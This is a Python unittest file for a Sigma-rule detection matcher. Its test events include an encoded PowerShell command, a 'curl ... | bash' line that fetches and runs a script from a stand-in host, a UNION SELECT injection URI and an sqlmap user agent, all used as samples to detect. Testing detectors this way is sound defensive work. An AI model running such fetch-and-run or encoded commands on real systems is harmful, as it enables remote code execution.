"""Tests for the Sigma subset matcher."""

from __future__ import annotations

import unittest

from rulelab.errors import SigmaSyntaxError
from rulelab.matcher import lint_detection, rule_matches


def _rule(detection: dict) -> dict:
    return {"detection": detection}


class MatcherTests(unittest.TestCase):
    def test_contains_is_case_insensitive_and_endswith_keeps_backslashes(self) -> None:
        rule = _rule(
            {
                "selection": {
                    "Image|endswith": "\\powershell.exe",
                    "CommandLine|contains": " -enc ",
                },
                "condition": "selection",
            }
        )
        self.assertTrue(
            rule_matches(
                rule,
                {
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -NoP -Enc SQBFAFgA",
                },
            )
        )
        self.assertFalse(
            rule_matches(
                rule,
                {
                    "Image": "C:\\Windows\\System32\\notepad.exe",
                    "CommandLine": "notepad.exe -enc something",
                },
            )
        )

    def test_startswith_re_and_all(self) -> None:
        rule = _rule(
            {
                "selection": {
                    "message|startswith": "new user: name=",
                    "command_line|contains|all": ["curl", "bash"],
                    "message|re": "name=[a-z]+",
                },
                "condition": "selection",
            }
        )
        self.assertTrue(
            rule_matches(
                rule,
                {
                    "message": "new user: name=svc-lab, UID=1007",
                    "command_line": "curl http://203.0.113.50/a.sh | bash",
                },
            )
        )
        self.assertFalse(
            rule_matches(
                rule,
                {
                    "message": "new user: name=svc-lab, UID=1007",
                    "command_line": "curl http://203.0.113.50/a.sh -o /tmp/a.sh",
                },
            )
        )

    def test_re_is_case_sensitive_unless_the_pattern_opts_in(self) -> None:
        rule = _rule(
            {
                "selection": {"message|re": "Failed password"},
                "condition": "selection",
            }
        )
        self.assertTrue(rule_matches(rule, {"message": "Failed password for labuser"}))
        self.assertFalse(rule_matches(rule, {"message": "failed password for labuser"}))

    def test_and_or_not_precedence_and_parentheses(self) -> None:
        rule = _rule(
            {
                "alpha": {"kind": "alpha"},
                "beta": {"kind": "beta"},
                "gamma": {"kind": "gamma"},
                "condition": "alpha or beta and gamma",
            }
        )
        # and binds tighter: alpha OR (beta AND gamma)
        self.assertTrue(rule_matches(rule, {"kind": "alpha"}))
        self.assertFalse(rule_matches(rule, {"kind": "beta"}))
        self.assertTrue(rule_matches(rule, {"kind": "beta"}) is False)
        parent = _rule(
            {
                "keep": {"status": "keep"},
                "drop": {"noise": "yes"},
                "condition": "keep and not drop",
            }
        )
        self.assertTrue(rule_matches(parent, {"status": "keep", "noise": "no"}))
        self.assertFalse(rule_matches(parent, {"status": "keep", "noise": "yes"}))

    def test_one_of_glob_and_keywords(self) -> None:
        rule = _rule(
            {
                "selection_union": {"uri|contains": "union select"},
                "selection_tool": {"user_agent|contains": "sqlmap"},
                "keywords": ["backup completed"],
                "condition": "1 of selection* or keywords",
            }
        )
        self.assertTrue(rule_matches(rule, {"uri": "/id=1 UNION SELECT", "user_agent": "browser"}))
        self.assertTrue(rule_matches(rule, {"uri": "/", "user_agent": "sqlmap/1.8"}))
        self.assertFalse(rule_matches(rule, {"uri": "/catalog", "user_agent": "browser"}))
        self.assertTrue(rule_matches(rule, {"uri": "/", "note": "Backup completed"}))

    def test_plain_wildcard_and_list_or(self) -> None:
        rule = _rule(
            {
                "selection": {"process": ["useradd", "adduser"], "image|endswith": "/s?hd"},
                "condition": "selection",
            }
        )
        self.assertTrue(rule_matches(rule, {"process": "useradd", "image": "/usr/sbin/sshd"}))
        self.assertFalse(rule_matches(rule, {"process": "usermod", "image": "/usr/sbin/sshd"}))

    def test_aggregations_and_unknown_modifiers_fail(self) -> None:
        with self.assertRaises(SigmaSyntaxError):
            lint_detection({"selection": {"EventID": 1}, "condition": "selection | count() > 5"})
        with self.assertRaises(SigmaSyntaxError):
            lint_detection(
                {"selection": {"CommandLine|base64offset|contains": "abc"}, "condition": "selection"}
            )
        with self.assertRaises(SigmaSyntaxError):
            lint_detection(
                {
                    "selection": {"Image|endswith": "\\a.exe"},
                    "unused": {"Image|endswith": "\\b.exe"},
                    "condition": "selection",
                }
            )

    def test_missing_field_does_not_match(self) -> None:
        rule = _rule({"selection": {"EventID": 1102}, "condition": "selection"})
        self.assertFalse(rule_matches(rule, {"Channel": "Security"}))
        self.assertTrue(rule_matches(rule, {"EventID": "1102"}))


if __name__ == "__main__":
    unittest.main()
